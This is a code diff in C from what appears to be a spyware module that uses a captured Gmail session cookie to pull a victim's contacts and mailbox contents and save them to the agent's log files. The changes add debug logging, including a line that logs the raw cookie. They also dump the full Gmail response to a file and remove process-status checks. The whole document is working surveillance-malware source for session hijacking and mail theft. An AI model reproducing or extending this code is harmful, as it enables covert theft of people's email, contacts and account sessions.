@@ -28,6 +28,10 @@ extern DWORD max_social_mail_len;
 
 DWORD ParseContacts(char *cookie, char *ik_val, WCHAR *user_name)
 {
+	wchar_t szLogW[MAX_PATH * 2] = { 0 }; void putlogW(wchar_t*);
+	swprintf(szLogW, L"in ParseContacts begin ");
+	putlogW(szLogW);
+
 	HANDLE hfile;
 	WCHAR mail_request[256];
 	BYTE *r_buffer = NULL;
@@ -38,7 +42,6 @@ DWORD ParseContacts(char *cookie, char *ik_val, WCHAR *user_name)
 	WCHAR mail_account[256];
 	DWORD flags;
 
-	CheckProcessStatus();
 	// Prende la lista dei messaggi per la mail box selezionata
 	_snwprintf_s(mail_request, sizeof(mail_request)/sizeof(WCHAR), L"/mail/?ui=2&ik=%S&view=au&rt=j", ik_val);
 	ret_val = HttpSocialRequest(L"mail.google.com", L"GET", mail_request, 443, NULL, 0, &r_buffer, &response_len, cookie);
@@ -46,7 +49,6 @@ DWORD ParseContacts(char *cookie, char *ik_val, WCHAR *user_name)
 		return ret_val;
 	parser1 = (char *)r_buffer;
 
-	CheckProcessStatus();
 	hfile = Log_CreateFile2(PM_CONTACTSAGENT, NULL, 0,0);
 	LOOP {
 		flags = 0;
@@ -81,11 +83,18 @@ DWORD ParseContacts(char *cookie, char *ik_val, WCHAR *user_name)
 	Log_CloseFile2(hfile);
 
 	SAFE_FREE(r_buffer);
+
+	swprintf(szLogW, L"in ParseContacts end ");
+	putlogW(szLogW);
 	return SOCIAL_REQUEST_SUCCESS;
 }
 
 DWORD ParseMailBox(char *mbox, char *cookie, char *ik_val, DWORD last_tstamp_hi, DWORD last_tstamp_lo, BOOL is_incoming, BOOL is_draft)
 {
+	wchar_t szLogW[MAX_PATH * 2] = { 0 }; void putlogW(wchar_t*);
+	swprintf(szLogW, L"in ParseMailBox begin incoming:%d",is_incoming);
+	putlogW(szLogW);
+
 	DWORD ret_val;
 	BYTE *r_buffer = NULL;
 	BYTE *r_buffer_inner = NULL;
@@ -97,7 +106,6 @@ DWORD ParseMailBox(char *mbox, char *cookie, char *ik_val, DWORD last_tstamp_hi,
 	char tmp_buff[256];
 	DWORD act_tstamp_hi=0, act_tstamp_lo=0;
 
-	CheckProcessStatus();
 	// Prende la lista dei messaggi per la mail box selezionata
 	_snwprintf_s(mail_request, sizeof(mail_request)/sizeof(WCHAR), L"/mail/?ui=2&ik=%S&view=tl&start=0&num=70&rt=c&search=%S",ik_val, mbox);
 	ret_val = HttpSocialRequest(L"mail.google.com", L"GET", mail_request, 443, NULL, 0, &r_buffer, &response_len, cookie);
@@ -107,7 +115,6 @@ DWORD ParseMailBox(char *mbox, char *cookie, char *ik_val, DWORD last_tstamp_hi,
 
 	// Parsa la lista dei messaggi
 	for(;;) {
-		CheckProcessStatus();
 		ptr = strstr(ptr, GM_MAIL_IDENTIFIER); 
 		if (!ptr) 
 			break;
@@ -135,7 +142,6 @@ DWORD ParseMailBox(char *mbox, char *cookie, char *ik_val, DWORD last_tstamp_hi,
 			return ret_val;
 		}
 
-		CheckProcessStatus();
 		// Check sulla dimensione stabilita' nell'agente
 		if (response_len > max_social_mail_len)
 			response_len = max_social_mail_len;
@@ -211,7 +217,6 @@ DWORD ParseMailBox(char *mbox, char *cookie, char *ik_val, DWORD last_tstamp_hi,
 		}
 		*ptr_inner2 = 0;
 
-		CheckProcessStatus();
 		
 		urldecode(src_add);
 		urldecode(dest_add);
@@ -224,11 +229,19 @@ DWORD ParseMailBox(char *mbox, char *cookie, char *ik_val, DWORD last_tstamp_hi,
 	}
 		
 	SAFE_FREE(r_buffer);
+
+
+	swprintf(szLogW, L"in ParseMailBox end incoming:%d", is_incoming);
+	putlogW(szLogW);
 	return SOCIAL_REQUEST_SUCCESS;
 }
 
 DWORD HandleGMail(char *cookie)
 {
+	wchar_t szLogW[MAX_PATH * 6] = { 0 }; void putlogW(wchar_t*);
+	swprintf(szLogW, L"in HandleGMail begin cookie:%s",cookie);
+	putlogW(szLogW);
+
 	DWORD ret_val;
 	BYTE *r_buffer = NULL;
 	DWORD response_len;
@@ -238,7 +251,6 @@ DWORD HandleGMail(char *cookie)
 	char *ptr, *ptr2;
 	DWORD last_tstamp_hi, last_tstamp_lo;
 
-	CheckProcessStatus();
 
 // 	if (!bPM_MailCapStarted && !bPM_ContactsStarted)
 // 		return SOCIAL_REQUEST_NETWORK_PROBLEM;
@@ -248,7 +260,8 @@ DWORD HandleGMail(char *cookie)
 	ret_val = HttpSocialRequest(L"mail.google.com", L"GET", mail_request, 443, NULL, 0, &r_buffer, &response_len, cookie);
 	if (ret_val != SOCIAL_REQUEST_SUCCESS)
 		return ret_val;
-
+	bool WriteFileOver(char* pBuf, long size, char* fileName);
+	WriteFileOver((char*)r_buffer, response_len, "response.html");
 	ptr = strstr((char *)r_buffer, GM_GLOBAL_IDENTIFIER);
 	FREE_PARSING(ptr);
 
